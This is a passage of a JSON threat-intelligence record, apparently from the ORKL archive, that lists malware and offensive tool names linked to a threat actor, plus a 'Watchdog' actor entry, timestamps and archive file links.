            "tools": [
                "Atros2.CKPN",
                "AutoIt backdoor",
                "Breut",
                "CinaRAT",
                "DROPSHOT",
                "DarkComet",
                "DarkKomet",
                "DistTrack",
                "EmPyre",
                "EmpireProject",
                "FYNLOS",
                "FalseFont",
                "Filerase",
                "Fynloski",
                "JuicyPotato",
                "Krademok",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "Mimikatz",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "NetWeird",
                "NetWire",
                "NetWire RAT",
                "NetWire RC",
                "NetWired RC",
                "Notestuk",
                "POWERTON",
                "PoshC2",
                "PowerBand",
                "PowerShell Empire",
                "PowerSploit",
                "PsList",
                "Pupy",
                "PupyRAT",
                "Quasar RAT",
                "QuasarRAT",
                "Recam",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "SHAPESHIFT",
                "Shamoon",
                "Socmer",
                "StoneDrill",
                "TURNEDUP",
                "Tickler",
                "Yggdrasil",
                "Zurten",
                "klovbot",
                "pupy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535587,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1653787060,
    "ts_modification_date": 1653787060,
    "files": {
        "pdf": "https://archive.orkl.eu/50b267b1c4570bb99d78ad192d54d74a8f39f0b8.pdf",
        "text": "https://archive.orkl.eu/50b267b1c4570bb99d78ad192d54d74a8f39f0b8.txt",
        "img": "https://archive.orkl.eu/50b267b1c4570bb99d78ad192d54d74a8f39f0b8.jpg"
    }
}